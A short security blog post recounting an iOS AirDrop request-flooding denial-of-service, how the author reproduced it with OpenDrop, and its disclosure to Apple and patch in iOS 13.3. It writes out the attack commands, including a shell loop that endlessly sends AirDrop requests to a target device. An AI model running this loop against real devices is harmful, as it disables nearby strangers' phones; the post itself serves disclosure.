---
title: 'AirBomb - AirDrop denial of service'
summary: 'From being personally exploited on a train to Apple patching the attack.'
date: '2019-12-10'
---

One Sunday a couple of months ago, I was sitting on a train when all of a sudden my iPhone, and many other iPhones around me, all started pinging at the same time with the AirDrop request notification. After denying the request, it instantly popped up again, and again, and again... rendering the affected devices unusable. Even after restarting the device, the attack would start again.

After experiencing this first hand, I had a go at recreating the same attack. It was trivial - using [OpenDrop](https://github.com/seemoo-lab/opendrop), a macOS or Linux user can send and receive files via the command line using the AirDrop protocol that all iOS devices support.

Once OpenDrop is setup, the attack is as simple as running:

```
$ opendrop find
```

to find the ID of the iOS device to attack, and then:

```
$ while true; do opendrop send -r <DEVICE_ID> -f <FILENAME>; done
```

to force an infinite AirDrop request message on the device.

Using multi-threading it’s simple to run the same attack against all devices that were found in the first step.

I emailed Apple product security and after some back-and-forth a patch was introduced in the iOS 13.3 beta, whereby a device will automatically start declining requests from the same device after 3 have been manually declined.

Timeline:

* **2019-10-07**: Exploit reported to Apple product security
* **2019-10-08**: Reply from Apple stating that they will be investigating
* **2019-11-14**: Second reply from Apple stating that the issue will be patched in iOS 13.3, and asking me to test the beta release
* **2019-12-04**: I confirm that the issue is fixed in iOS 13.3 beta
